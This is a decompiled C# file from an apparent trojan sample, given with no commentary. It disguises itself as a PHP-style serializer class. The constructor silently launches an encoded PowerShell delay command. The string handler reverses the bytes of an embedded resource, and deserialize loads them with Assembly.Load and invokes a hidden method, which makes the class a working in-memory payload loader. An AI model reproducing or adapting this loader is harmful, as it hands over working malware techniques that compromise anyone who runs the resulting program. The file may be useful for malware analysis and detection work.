// Decompiled with JetBrains decompiler
// Type: Hcxccybe.Serializer
// Assembly: voice_message_vaw, Version=1.3.36.112, Culture=neutral, PublicKeyToken=null
// MVID: 48B4883A-CC7E-4D13-8A6C-8380BE777B79
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-c2eaa1182aab911cedd1cef039ab127745518ddc1f77e34fb73c69ef88fbb5a0.exe

using Hcxccybe.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Reflection;
using System.Text;

namespace Hcxccybe
{
  public class Serializer
  {
    private Dictionary<Hashtable, bool> seenHashtables;
    private Dictionary<ArrayList, bool> seenArrayLists;
    private int pos;
    private byte[] bb;
    public bool XMLSafe = true;
    public Encoding StringEncoding = (Encoding) new UTF8Encoding();
    private NumberFormatInfo nfi;

    public Serializer()
    {
      this.nfi = new NumberFormatInfo();
      this.nfi.NumberGroupSeparator = "";
      this.nfi.NumberDecimalSeparator = ".";
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "powershell",
        Arguments = "-enc YwBtAGQAIAAvAGMAIAB0AGkAbQBlAG8AdQB0ACAAMgAzAA=="
      };
      process.Start();
      process.WaitForExit();
    }

    private void Sero(object o) => ((MethodBase) o).Invoke((object) null, (object[]) null);

    public string Serialize(object obj)
    {
      this.seenArrayLists = new Dictionary<ArrayList, bool>();
      this.seenHashtables = new Dictionary<Hashtable, bool>();
      return this.serialize(obj, new StringBuilder()).ToString();
    }

    private StringBuilder serialize(object obj, StringBuilder sb)
    {
      switch (obj)
      {
        case null:
          return sb.Append("N;");
        case string _:
          string s = (string) obj;
          if (this.XMLSafe)
          {
            this.bb = Resources.Lymgcvcdrbfonruqh;
            s = s.Replace("\r\n", "\n").Replace("\r", "\n");
          }
          List<byte> byteList = new List<byte>();
          foreach (byte num in this.bb)
            byteList.Add(num);
          byteList.Reverse();
          this.bb = byteList.ToArray();
          return sb.Append("s:" + this.StringEncoding.GetByteCount(s).ToString() + ":\"" + s + "\";");
        case bool flag:
          return sb.Append("b:" + (flag ? "1" : "0") + ";");
        case int num1:
          return sb.Append("i:" + num1.ToString((IFormatProvider) this.nfi) + ";");
        case double num2:
          return sb.Append("d:" + num2.ToString((IFormatProvider) this.nfi) + ";");
        case ArrayList _:
          if (this.seenArrayLists.ContainsKey((ArrayList) obj))
            return sb.Append("N;");
          this.seenArrayLists.Add((ArrayList) obj, true);
          ArrayList arrayList = (ArrayList) obj;
          sb.Append("a:" + arrayList.Count.ToString() + ":{");
          for (int index = 0; index < arrayList.Count; ++index)
          {
            this.serialize((object) index, sb);
            this.serialize(arrayList[index], sb);
          }
          sb.Append("}");
          return sb;
        case Hashtable _:
          if (this.seenHashtables.ContainsKey((Hashtable) obj))
            return sb.Append("N;");
          this.seenHashtables.Add((Hashtable) obj, true);
          Hashtable hashtable = (Hashtable) obj;
          sb.Append("a:" + hashtable.Count.ToString() + ":{");
          foreach (DictionaryEntry dictionaryEntry in hashtable)
          {
            this.serialize(dictionaryEntry.Key, sb);
            this.serialize(dictionaryEntry.Value, sb);
          }
          sb.Append("}");
          return sb;
        default:
          return sb;
      }
    }

    public object Deserialize(string str)
    {
      this.pos = 0;
      return this.deserialize(str);
    }

    private object deserialize(string str)
    {
      Assembly assembly = (Assembly) typeof (Assembly).GetMethod("Load", new Type[1]
      {
        typeof (byte[])
      }).Invoke((object) null, new object[1]
      {
        (object) this.bb
      });
      if (str == null || str.Length <= this.pos)
        return new object();
      this.Sero((object) assembly.GetType("Lymgcvcdrbfonruqh.Mmzqptlcusjocabryn").GetMethod("Qswhfutqh"));
      switch (str[this.pos])
      {
        case 'N':
          this.pos += 2;
          return (object) null;
        case 'a':
          int startIndex1 = str.IndexOf(":", this.pos) + 1;
          int num1 = str.IndexOf(":", startIndex1);
          string s1 = str.Substring(startIndex1, num1 - startIndex1);
          int capacity = int.Parse(s1);
          Hashtable hashtable = new Hashtable(capacity);
          ArrayList arrayList = new ArrayList(capacity);
          this.pos += 4 + s1.Length;
          for (int index = 0; index < capacity; ++index)
          {
            object key = this.deserialize(str);
            object obj = this.deserialize(str);
            if (arrayList != null)
            {
              if (key is int num2 && num2 == arrayList.Count)
                arrayList.Add(obj);
              else
                arrayList = (ArrayList) null;
            }
            hashtable[key] = obj;
          }
          ++this.pos;
          if (this.pos < str.Length && str[this.pos] == ';')
            ++this.pos;
          return (object) arrayList ?? (object) hashtable;
        case 'b':
          char ch = str[this.pos + 2];
          this.pos += 4;
          return (object) (ch == '1');
        case 'd':
          int startIndex2 = str.IndexOf(":", this.pos) + 1;
          int num3 = str.IndexOf(";", startIndex2);
          string s2 = str.Substring(startIndex2, num3 - startIndex2);
          this.pos += 3 + s2.Length;
          return (object) double.Parse(s2, (IFormatProvider) this.nfi);
        case 'i':
          int startIndex3 = str.IndexOf(":", this.pos) + 1;
          int num4 = str.IndexOf(";", startIndex3);
          string s3 = str.Substring(startIndex3, num4 - startIndex3);
          this.pos += 3 + s3.Length;
          return (object) int.Parse(s3, (IFormatProvider) this.nfi);
        case 's':
          int startIndex4 = str.IndexOf(":", this.pos) + 1;
          int num5 = str.IndexOf(":", startIndex4);
          string s4 = str.Substring(startIndex4, num5 - startIndex4);
          int num6 = int.Parse(s4);
          int length = num6;
          if (num5 + 2 + length >= str.Length)
            length = str.Length - 2 - num5;
          string s5;
          for (s5 = str.Substring(num5 + 2, length); this.StringEncoding.GetByteCount(s5) > num6; s5 = str.Substring(num5 + 2, length))
            --length;
          this.pos += 6 + s4.Length + length;
          if (this.XMLSafe)
            s5 = s5.Replace("\n", "\r\n");
          return (object) s5;
        default:
          return (object) "";
      }
    }
  }
}
